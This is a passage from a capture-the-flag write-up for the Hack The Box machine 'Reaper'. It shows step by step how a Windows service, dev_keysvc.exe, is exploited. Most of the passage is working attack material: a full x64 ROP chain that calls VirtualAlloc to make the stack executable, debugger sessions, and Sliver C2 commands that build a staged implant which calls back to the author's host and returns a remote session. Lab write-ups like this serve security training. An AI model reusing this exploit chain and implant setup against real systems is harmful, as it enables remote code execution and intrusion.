        <span class="n">base</span><span class="o">+</span><span class="mh">0x20d9</span><span class="p">,</span>        <span class="c1">#: pop rbx ; ret ;</span>
        <span class="mh">0x1000</span><span class="p">,</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1f90</span><span class="p">,</span>        <span class="c1">#: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ;</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>

    <span class="p">]])</span>
</code></pre></div>
<p>In order to debug the ROPchain, I need to figure out the exact return address that  crashes.  As it turns out, it is the return instruction of the function I step over, not a nested return.  <code>00007ff74bcf16f1</code></p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251102135755.png" data-desc-position="bottom"><img alt="Pasted_image_20251102135755.png" src="../../../../Pasted_image_20251102135755.png"></a></p>
<p>For reference we're talking about this function here:</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109120758.png" data-desc-position="bottom"><img alt="Pasted_image_20251109120758.png" src="../../../../Pasted_image_20251109120758.png"></a></p>
<p>I set a breakpoint for the address of the return instruction at the end of <code>crash_in_here</code>, after the three continues, that way I can step into the return, which takes me right to the ROPchain.</p>
<div class="highlight"><pre><span></span><code><span class="o">((</span>cmd.exe<span class="w"> </span>/c<span class="w"> </span><span class="s2">"taskkill /F /IM dev_keysvc.exe"</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"C:\reaper\dev_keysvc.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\r</span>eaper<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"C:\reaper\dev_keysvc.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\r</span>eaper<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe"</span><span class="w"> </span>-WF<span class="w"> </span>C:<span class="se">\w</span>indbg_custom.WEW<span class="w"> </span>-pn<span class="w"> </span>dev_keysvc.exe<span class="w"> </span>-c<span class="w"> </span><span class="s1">'bp 0x7ff74bcf1937; g; g; g; bp 0x00007ff74bcf16f1; g;'</span>
</code></pre></div>
<p>When I resend the payload, execution stops at the return instruction.  I step into it, and I am in the ROPchain:</p>
<div class="highlight"><pre><span></span><code>00007fff`c06d10d0 cc              int     3
0:003&gt; bp 0x7ff74bcf1937; g; g; g; bp 0x00007ff74bcf16f1; g;
ModLoad: 00007fff`bbb30000 00007fff`bbb42000   C:\Windows\SYSTEM32\kernel.appcore.dll
ModLoad: 00007fff`bf620000 00007fff`bf6be000   C:\Windows\System32\msvcrt.dll
Breakpoint 0 hit
*** WARNING: Unable to verify checksum for C:\reaper\dev_keysvc.exe
Breakpoint 0 hit
Breakpoint 0 hit
Breakpoint 1 hit
dev_keysvc+0x16f1:
00007ff7`4bcf16f1 c3              ret
0:003&gt; t
dev_keysvc+0x20d9:
00007ff7`4bcf20d9 5b              pop     rbx
</code></pre></div>
<p>Rather than bore with the gritty details, lets jump straight to the ROPchain I settled on.</p>
<h3 id="final-ropchain">Final ROPchain<a class="headerlink" href="#final-ropchain" title="Permanent link">¶</a></h3>
<p><code>r8</code> and <code>r9</code> are going to be the hardest to work around, due to the lack of gadgets so the options are limited.</p>
<p>The one gadget I have to work with for <code>r9</code> nukes <code>r8</code> in the process, so need to get <code>r9</code> right out of the way.  I'll pop <code>0x40</code> into <code>rbx</code>, then use the one gadget to <code>mov r9, rbx</code>.  Consequentially, <code>r8</code> gets nulled.  And <code>rsp</code> gets <code>0x08</code> added to it, so need  a dummy qword to realign.</p>
<div class="highlight"><pre><span></span><code>        <span class="c1">## 0x1000 to r9</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x20d9</span><span class="p">,</span>        <span class="c1">#: pop rbx ; ret ;</span>
        <span class="mh">0x40</span><span class="p">,</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1f90</span><span class="p">,</span>        <span class="c1">#: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ;</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
</code></pre></div>
<p><code>r8</code> is a little more nuanced.  I'll pop <code>0x1000</code> into <code>rax</code>, exchange <code>eax</code> and <code>edx</code> , then <code>or</code> <code>edx</code> against <code>r8d</code>, net-effect is like a <code>mov</code>.  The rest of the instructions do not affect my setup for the <code>VirtualAlloc</code> call or existing registers to that end.</p>
<div class="highlight"><pre><span></span><code>        <span class="c1">## 0x1000 to r8</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x150a</span><span class="p">,</span>        <span class="c1">#: pop rax ; ret ;</span>
        <span class="mh">0x1000</span><span class="p">,</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0xe97a</span><span class="p">,</span>        <span class="c1">#: xchg eax, edx ; ret ;</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1bd8c</span><span class="p">,</span>       <span class="c1">#: or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ;</span>
</code></pre></div>
<p><code>rdx</code> is even easier, because its already <code>0x1000</code> as a consequence of setting for <code>r8</code></p>
<div class="highlight"><pre><span></span><code>        <span class="c1">## 0x1000 to rdx</span>
        <span class="c1">## Nothing needed, rdx is already 0x1000 because of r8 above</span>

        <span class="c1"># 0:003&gt; r</span>
        <span class="c1"># rax=0000000000001000 rbx=0000000000000040 rcx=75370cfeeea40000</span>
        <span class="c1"># rdx=0000000000001000 rsi=0000000000000000 rdi=4141414141414141</span>
        <span class="c1"># rip=00007ff74bcf1fa0 rsp=000000f65adfe690 rbp=0000000000000000</span>
        <span class="c1"># r8=0000000000001000  r9=0000000000000040 r10=0000000000000000</span>
        <span class="c1"># r11=000000f65adfe560 r12=0000000000000000 r13=0000000000000000</span>
        <span class="c1"># r14=0000000000000000 r15=0000000000000000</span>
</code></pre></div>
<p><code>rcx</code> is the most complex of the four registers, but not by much.  <code>rbx</code> is already <code>0x40</code>, and the address doesn't have to be exacting because the <code>VirtualAlloc</code> is done on an entire page, any address within it will do.  Now is a good time to save <code>rbx</code>, because it has an approximate address in the range of where we eventually jump after <code>VirtualAlloc</code>.  So that gets saved to <code>r12</code> for the end.  Push <code>rbx</code> and pop back in <code>rax</code>, then <code>mov rcx</code>.  </p>
<div class="highlight"><pre><span></span><code>        <span class="c1">## rsp to rcx</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1fa0</span><span class="p">,</span>        <span class="c1">#: xor rbx, rsp ; ret ;</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1fb3</span><span class="p">,</span>        <span class="c1">#: mov r12, rbx ; ret ;  ## for jmp/call rax later</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1fc2</span><span class="p">,</span>        <span class="c1">#: push rbx ; pop rax ; ret ;</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1f80</span><span class="p">,</span>        <span class="c1">#: mov rcx, rax ; ret ;</span>
</code></pre></div>
<p>And then there's calling <code>VirtualAlloc</code>.  The address of <code>VirtualAlloc</code> from the IAT Import Address Table gets popped into <code>rax</code>.  However we can't call that directly, it needs to be dereferenced first.  That is made possible by the <code>mov rax, qword [rax]</code>, which takes the value pointed at by <code>rax</code> and places that into <code>rax</code>.  The cost of this gadget is that <code>rsp</code> gets incremented by <code>0x28</code>, so five dummy qwords are placed on the stack afterward to realign.  The <code>ret</code> statement of that gadget net-effect jumps over those five qwords and lands at the <code>push rax</code> gadget.  <code>rax</code> is pushed onto the stack, popped back into <code>rdi</code>.  Then <code>rdi</code> is pushed onto the stack, and <code>ret</code>urned to. </p>
<div class="highlight"><pre><span></span><code>        <span class="c1">## call VirtualAlloc</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x150a</span><span class="p">,</span>        <span class="c1">#: pop rax ; ret ;</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x20000</span><span class="p">,</span>       <span class="c1">## IAT VirtualAlloc VA</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1547f</span><span class="p">,</span>       <span class="c1">#: mov rax, qword [rax] ; add rsp, 0x28 ; ret ;</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x5d6d</span><span class="p">,</span>        <span class="c1">#: push rax ; pop rdi ; ret ;</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x3db5</span><span class="p">,</span>        <span class="c1">#: push rdi ; ret ;</span>
</code></pre></div>
<p>The call to <code>VirtualAlloc</code> requires a scratch area, "shadow space", <code>rsp</code> immediately following the call.  Callee is responsible for stack cleanup, which means <code>rsp</code> needs to be realigned after <code>VirtualAlloc</code>.  The convention calls for 32 bytes (0x20).  I found a gadget for adding <code>0x28</code> to <code>rsp</code>.  </p>
<div class="highlight"><pre><span></span><code>        <span class="c1">## realign RSP, RE: shadow space / VA scratch area</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x175b</span><span class="p">,</span>          <span class="c1">#: add rsp, 0x28 ; ret ;</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
</code></pre></div>
<p>Finally, a chain for controlling <code>rip</code>.  The following adds an offset to the <code>rsp</code> (at the time) that was <code>xor</code>'d into <code>rbx</code>, and then saved into <code>r12</code>.  And then jumps there.</p>
<div class="highlight"><pre><span></span><code>        <span class="c1">## jmp/call rsp</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x150a</span><span class="p">,</span>        <span class="c1">#: pop rax ; ret ;</span>
        <span class="mh">0xf0</span><span class="p">,</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x368c</span>         <span class="c1">#: add rax, r12 ; mov rdx, r13 ; call rax ;</span>
</code></pre></div>
<p>The final ROPchain</p>
<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">ROPchain1</span><span class="p">(</span><span class="n">base</span><span class="p">):</span>
    <span class="c1">## crashtime regs</span>
    <span class="c1"># 0:003&gt; r</span>
    <span class="c1"># rax=00000000ffffffff rbx=000001e554b7bc60 rcx=4a4db4eaa5a70000</span>
    <span class="c1"># rdx=0000000000000000 rsi=0000000000000000 rdi=4141414141414141</span>
    <span class="c1"># rip=00007ff766a816f1 rsp=000000d2a29fe908 rbp=0000000000000000</span>
    <span class="c1"># r8=0000000000000054  r9=0000000000000054 r10=0000000000000007</span>
    <span class="c1"># r11=000000d2a29fe820 r12=0000000000000000 r13=0000000000000000</span>
    <span class="c1"># r14=0000000000000000 r15=0000000000000000</span>
    <span class="c1"># iopl=0         nv up ei pl nz na po nc</span>
    <span class="c1"># cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206</span>
    <span class="k">return</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">packlatin</span><span class="p">(</span><span class="s2">"&lt;Q"</span><span class="p">,</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span>
        <span class="c1">## 0x40 to r9</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x20d9</span><span class="p">,</span>        <span class="c1">#: pop rbx ; ret ;</span>
        <span class="mh">0x40</span><span class="p">,</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1f90</span><span class="p">,</span>        <span class="c1">#: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ;</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>

        <span class="c1">## 0x1000 to r8</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x150a</span><span class="p">,</span>        <span class="c1">#: pop rax ; ret ;</span>
        <span class="mh">0x1000</span><span class="p">,</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0xe97a</span><span class="p">,</span>        <span class="c1">#: xchg eax, edx ; ret ;</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1bd8c</span><span class="p">,</span>       <span class="c1">#: or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ;</span>

        <span class="c1">## 0x1000 to rdx</span>
        <span class="c1">## Nothing needed, rdx is already 0x1000 because of r8 above</span>

        <span class="c1"># 0:003&gt; r</span>
        <span class="c1"># rax=0000000000001000 rbx=0000000000000040 rcx=75370cfeeea40000</span>
        <span class="c1"># rdx=0000000000001000 rsi=0000000000000000 rdi=4141414141414141</span>
        <span class="c1"># rip=00007ff74bcf1fa0 rsp=000000f65adfe690 rbp=0000000000000000</span>
        <span class="c1"># r8=0000000000001000  r9=0000000000000040 r10=0000000000000000</span>
        <span class="c1"># r11=000000f65adfe560 r12=0000000000000000 r13=0000000000000000</span>
        <span class="c1"># r14=0000000000000000 r15=0000000000000000</span>


        <span class="c1">## rsp to rcx</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1fa0</span><span class="p">,</span>        <span class="c1">#: xor rbx, rsp ; ret ;</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1fb3</span><span class="p">,</span>        <span class="c1">#: mov r12, rbx ; ret ;  ## for jmp/call rsp later</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1fc2</span><span class="p">,</span>        <span class="c1">#: push rbx ; pop rax ; ret ;</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1f80</span><span class="p">,</span>        <span class="c1">#: mov rcx, rax ; ret ;</span>

        <span class="c1">## call VirtualAlloc</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x150a</span><span class="p">,</span>        <span class="c1">#: pop rax ; ret ;</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x20000</span><span class="p">,</span>       <span class="c1">## IAT VirtualAlloc VA</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x1547f</span><span class="p">,</span>       <span class="c1">#: mov rax, qword [rax] ; add rsp, 0x28 ; ret ;</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x5d6d</span><span class="p">,</span>        <span class="c1">#: push rax ; pop rdi ; ret ;</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x3db5</span><span class="p">,</span>        <span class="c1">#: push rdi ; ret ;</span>

        <span class="c1">## realign RSP, RE: shadow space / VA scratch area</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x175b</span><span class="p">,</span>          <span class="c1">#: add rsp, 0x28 ; ret ;</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>
        <span class="mh">0xfeedcafedeadbeef</span><span class="p">,</span>

        <span class="c1">## jmp/call rsp</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x150a</span><span class="p">,</span>        <span class="c1">#: pop rax ; ret ;</span>
        <span class="mh">0xf0</span><span class="p">,</span>
        <span class="n">base</span><span class="o">+</span><span class="mh">0x368c</span>         <span class="c1">#: add rax, r12 ; mov rdx, r13 ; call rax ;</span>
</code></pre></div>
<p>When I step through execution to the <code>ret</code> instruction in the last gadget for calling <code>VirtualAlloc</code>,  <code>push rdi ; ret ;</code>, and check memory protection on <code>rsp</code>, the protection is <code>0x4</code> <code>PAGE_READWRITE</code>:</p>
<div class="highlight"><pre><span></span><code>0:003&gt; 
dev_keysvc+0x3db5:
00007ff7`4bcf3db5 57              push    rdi
0:003&gt; 
dev_keysvc+0x3db6:
00007ff7`4bcf3db6 c3              ret
0:003&gt; !vprot rsp
BaseAddress:       000000dc9fafe000
AllocationBase:    000000dc9fa00000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        0000000000002000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE
Type:              00020000  MEM_PRIVATE
</code></pre></div>
<p>If I step through and step out of <code>VirtualAlloc</code>, then re-check protection, it has been updated, and protection is now <code>0x40</code> <code>PAGE_EXECUTE_READWRITE</code></p>
<div class="highlight"><pre><span></span><code>0:003&gt; t
KERNEL32!VirtualAllocStub:
00007fff`befa8840 48ff25e9c30600  jmp     qword ptr [KERNEL32!_imp_VirtualAlloc (00007fff`bf014c30)] ds:00007fff`bf014c30={KERNELBASE!VirtualAlloc (00007fff`be03fd10)}
0:003&gt; pt
KERNELBASE!VirtualAlloc+0x5a:
00007fff`be03fd6a c3              ret
0:003&gt; t
dev_keysvc+0x2bb9:
00007ff7`4bcf2bb9 54              push    rsp
0:003&gt; !vprot rsp
BaseAddress:       000000dc9fafe000
AllocationBase:    000000dc9fa00000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        0000000000002000
State:             00001000  MEM_COMMIT
Protect:           00000040  PAGE_EXECUTE_READWRITE
Type:              00020000  MEM_PRIVATE
</code></pre></div>
<p>Stepping through <code>call rax</code>, I land in nopsled1:</p>
<div class="highlight"><pre><span></span><code>0:003&gt; dd rax
00000052`0d3fe800  90909090 90909090 90909090 90909090
00000052`0d3fe810  90909090 90909090 90909090 90909090
00000052`0d3fe820  90909090 90909090 90909090 90909090
00000052`0d3fe830  90909090 90909090 90909090 90909090
00000052`0d3fe840  43434343 43434343 43434343 43434343
00000052`0d3fe850  43434343 43434343 43434343 43434343
00000052`0d3fe860  43434343 43434343 43434343 43434343
00000052`0d3fe870  43434343 43434343 43434343 43434343
</code></pre></div>
<p>The following stub breaks right to the <code>call rax</code> instruction after sending the payload:
</p><div class="highlight"><pre><span></span><code><span class="o">((</span>cmd.exe<span class="w"> </span>/c<span class="w"> </span><span class="s2">"taskkill /F /IM dev_keysvc.exe"</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"C:\reaper\dev_keysvc.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\r</span>eaper<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"C:\reaper\dev_keysvc.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\r</span>eaper<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe"</span><span class="w"> </span>-WF<span class="w"> </span>C:<span class="se">\w</span>indbg_custom.WEW<span class="w"> </span>-pn<span class="w"> </span>dev_keysvc.exe<span class="w"> </span>-c<span class="w"> </span><span class="s1">'bp 0x7ff74bcf1937; g; g; g; bp 0x00007ff74bcf16f1; g; t 33; p; pt; t 7'</span>
</code></pre></div><p></p>
<h2 id="getting-the-shell">Getting the shell<a class="headerlink" href="#getting-the-shell" title="Permanent link">¶</a></h2>
<p>With the ROPchain completed, and execution flow controlled on the stack, the only thing left to do is generate some shellcode and get a shell.</p>
<p>I'll use a staged <code>Sliver</code> implant.</p>
<p>I start <code>sliver-server</code>, enable multiplayer (so <code>sliver-client</code> can connect to it), and start an <code>mtls</code> listener.  I'll also generate a new profile, as my IP on the VPN has recently changed.</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>sliver-server
<span class="o">[</span>...<span class="o">]</span>
<span class="o">[</span>server<span class="o">]</span><span class="w"> </span>sliver<span class="w"> </span>&gt;<span class="w"> </span>multiplayer<span class="w"> </span>
<span class="o">[</span>...<span class="o">]</span>
<span class="o">[</span>server<span class="o">]</span><span class="w"> </span>sliver<span class="w"> </span>&gt;<span class="w"> </span>mtls<span class="w"> </span>-t<span class="w"> </span><span class="m">240</span>
<span class="o">[</span>...<span class="o">]</span>
<span class="o">[</span>server<span class="o">]</span><span class="w"> </span>sliver<span class="w"> </span>&gt;<span class="w"> </span>new-operator<span class="w"> </span>--lhost<span class="w"> </span><span class="m">10</span>.10.16.59<span class="w"> </span>--save<span class="w"> </span>duff<span class="w"> </span>--name<span class="w"> </span>duff
</code></pre></div>
<p>That will stay running in a separate tab.  In a new tab, import the new-operator profile from above with <code>sliver-client</code>,  and connect
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>sliver-client<span class="w"> </span>import<span class="w"> </span>./duff

┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>sliver-client
?<span class="w"> </span>Select<span class="w"> </span>a<span class="w"> </span>server:<span class="w"> </span>duff@10.10.16.59<span class="w"> </span><span class="o">(</span>d627e2adf130f60a<span class="o">)</span>
Connecting<span class="w"> </span>to<span class="w"> </span><span class="m">10</span>.10.16.59:31337<span class="w"> </span>...
<span class="o">[</span>...<span class="o">]</span>
</code></pre></div><p></p>
<p>Generate a stage2 profile.  A <code>stager</code> will perform an initial connect to a <code>stage-listener</code>, and this profile defines what stage2 to send back. </p>
<div class="highlight"><pre><span></span><code>sliver<span class="w"> </span>&gt;<span class="w"> </span>profiles<span class="w"> </span>new<span class="w"> </span>--mtls<span class="w"> </span><span class="m">10</span>.10.16.59<span class="w"> </span>--skip-symbols<span class="w"> </span>--format<span class="w"> </span>shellcode<span class="w"> </span>--disable-sgn<span class="w"> </span>--os<span class="w"> </span>windows<span class="w"> </span>--arch<span class="w"> </span>amd64<span class="w"> </span>--timeout<span class="w"> </span><span class="m">240</span><span class="w"> </span>reaper

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>new<span class="w"> </span>implant<span class="w"> </span>profile<span class="w"> </span>reaper
</code></pre></div>
<p>Stand up a stage listener, and associate it with the profile.</p>
<div class="highlight"><pre><span></span><code>sliver<span class="w"> </span>&gt;<span class="w"> </span>stage-listener<span class="w"> </span>--url<span class="w"> </span>tcp://10.10.16.59:8443<span class="w"> </span>--profile<span class="w"> </span>reaper

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>builds<span class="w"> </span>found<span class="w"> </span><span class="k">for</span><span class="w"> </span>profile<span class="w"> </span>reaper,<span class="w"> </span>generating<span class="w"> </span>a<span class="w"> </span>new<span class="w"> </span>one
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Sliver<span class="w"> </span>name<span class="w"> </span><span class="k">for</span><span class="w"> </span>profile<span class="w"> </span>reaper:<span class="w"> </span>GRUBBY_MONGER
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Job<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">(</span>tcp<span class="o">)</span><span class="w"> </span>started
</code></pre></div>
<p>Generate a <code>stager</code>. </p>
<div class="highlight"><pre><span></span><code>sliver<span class="w"> </span>&gt;<span class="w"> </span>generate<span class="w"> </span>stager<span class="w"> </span>--lhost<span class="w"> </span><span class="m">10</span>.10.16.59<span class="w"> </span>--lport<span class="w"> </span><span class="m">8443</span><span class="w"> </span>--os<span class="w"> </span>windows<span class="w"> </span>--arch<span class="w"> </span>amd64<span class="w"> </span>--timeout<span class="w"> </span><span class="m">240</span><span class="w"> </span>--protocol<span class="w"> </span>tcp<span class="w"> </span>--format<span class="w"> </span>raw<span class="w"> </span>--save<span class="w"> </span>reaper_sc
</code></pre></div>
<p>The only modification I need to make to the PoC is to have the shellcode read in by file.</p>
<div class="highlight"><pre><span></span><code><span class="n">shellcode</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"sc.bin"</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>
</code></pre></div>
<p>After sending the payload to the target, after about a minute or so, I get a session.</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Session<span class="w"> </span>56ca80d6<span class="w"> </span>GRUBBY_MONGER<span class="w"> </span>-<span class="w"> </span><span class="m">10</span>.129.234.200:60901<span class="w"> </span><span class="o">(</span>reaper<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>windows/amd64<span class="w"> </span>-<span class="w"> </span>Mon,<span class="w"> </span><span class="m">03</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">2025</span><span class="w"> </span><span class="m">23</span>:13:23<span class="w"> </span>PST

sliver<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>56ca80d6-e50f-43af-bed7-ff99bd089b9c

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Active<span class="w"> </span>session<span class="w"> </span>GRUBBY_MONGER<span class="w"> </span><span class="o">(</span>56ca80d6-e50f-43af-bed7-ff99bd089b9c<span class="o">)</span>

sliver<span class="w"> </span><span class="o">(</span>GRUBBY_MONGER<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>info

<span class="w">        </span>Session<span class="w"> </span>ID:<span class="w"> </span>56ca80d6-e50f-43af-bed7-ff99bd089b9c
<span class="w">              </span>Name:<span class="w"> </span>GRUBBY_MONGER
<span class="w">          </span>Hostname:<span class="w"> </span>reaper
<span class="w">              </span>UUID:<span class="w"> </span>45b23042-98ac-1874-26d9-444968eb4273
<span class="w">          </span>Username:<span class="w"> </span>REAPER<span class="se">\k</span>eysvc
<span class="w">               </span>UID:<span class="w"> </span>S-1-5-21-2661617556-2774986859-216721275-1002
<span class="w">               </span>GID:<span class="w"> </span>S-1-5-21-2661617556-2774986859-216721275-513
<span class="w">               </span>PID:<span class="w"> </span><span class="m">4520</span>
<span class="w">                </span>OS:<span class="w"> </span>windows
<span class="w">           </span>Version:<span class="w"> </span><span class="m">10</span><span class="w"> </span>build<span class="w"> </span><span class="m">19045</span><span class="w"> </span>x86_64
<span class="w">            </span>Locale:<span class="w"> </span>en-US
<span class="w">              </span>Arch:<span class="w"> </span>amd64
<span class="w">         </span>Active<span class="w"> </span>C2:<span class="w"> </span>mtls://10.10.16.59:8888
<span class="w">    </span>Remote<span class="w"> </span>Address:<span class="w"> </span><span class="m">10</span>.129.234.200:60901
<span class="w">         </span>Proxy<span class="w"> </span>URL:<span class="w"> </span>
Reconnect<span class="w"> </span>Interval:<span class="w"> </span>1m0s
<span class="w">     </span>First<span class="w"> </span>Contact:<span class="w"> </span>Mon<span class="w"> </span>Nov<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">23</span>:13:23<span class="w"> </span>PST<span class="w"> </span><span class="m">2025</span><span class="w"> </span><span class="o">(</span>16m23s<span class="w"> </span>ago<span class="o">)</span>
<span class="w">      </span>Last<span class="w"> </span>Checkin:<span class="w"> </span>Mon<span class="w"> </span>Nov<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">23</span>:29:36<span class="w"> </span>PST<span class="w"> </span><span class="m">2025</span><span class="w"> </span><span class="o">(</span>10s<span class="w"> </span>ago<span class="o">)</span>
</code></pre></div>
<h2 id="poc">PoC<a class="headerlink" href="#poc" title="Permanent link">¶</a></h2>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span><span class="o">,</span><span class="w"> </span><span class="nn">sys</span><span class="o">,</span><span class="w"> </span><span class="nn">re</span><span class="o">,</span><span class="w"> </span><span class="nn">socket</span><span class="o">,</span><span class="w"> </span><span class="nn">binascii</span><span class="o">,</span><span class="w"> </span><span class="nn">time</span><span class="o">,</span><span class="w"> </span><span class="nn">base64</span>
